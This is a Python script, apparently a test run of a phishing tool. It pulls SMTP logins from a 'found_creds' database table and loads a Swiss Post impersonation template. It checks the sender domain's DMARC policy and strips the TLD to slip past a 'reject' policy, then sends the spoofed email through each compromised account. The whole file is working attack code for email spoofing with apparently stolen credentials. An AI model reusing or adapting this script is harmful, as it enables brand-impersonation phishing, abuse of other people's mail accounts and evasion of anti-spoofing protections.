import sys, sqlite3, traceback
sys.path.insert(0, '/opt/darkvasend')

# Force reimport of patched module
import importlib
import auditguard.campaign_sender
importlib.reload(auditguard.campaign_sender)
from auditguard.campaign_sender import _send_one, pick_best_spoof_mode, _strip_tld
from auditguard.spoof_templates import get_template

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row

for sid in [5, 6]:
    r = db.execute('SELECT * FROM found_creds WHERE id=?', (sid,)).fetchone()
    smtp_config = {
        'host': r['smtp_host'],
        'port': r['smtp_port'],
        'username': r['smtp_user'],
        'password': r['smtp_password'],
        'from_email': r['smtp_user'],
    }
    tpl = get_template('swisspost')
    print(f'\n=== FIXED _send_one SMTP #{sid} ({r["smtp_host"]}) ===', flush=True)

    best_mode, dmarc = pick_best_spoof_mode(tpl['from_email'])
    actual_from = tpl['from_email']
    if dmarc.get('policy') == 'reject':
        actual_from = _strip_tld(actual_from)
        print(f'TLD stripped: {actual_from}', flush=True)

    try:
        result = _send_one(
            smtp_config,
            tpl['from_name'],
            actual_from,
            'numerique.fiscal@gmail.com',
            tpl['subject'],
            tpl['html'],
            '',
            smtp_config.get('from_email', ''),
            tpl.get('reply_to', ''),
            best_mode,
            None,
        )
        print(f'Result: {result}', flush=True)
    except Exception as e:
        print(f'EXCEPTION: {type(e).__name__}: {e}', flush=True)
        traceback.print_exc()

db.close()
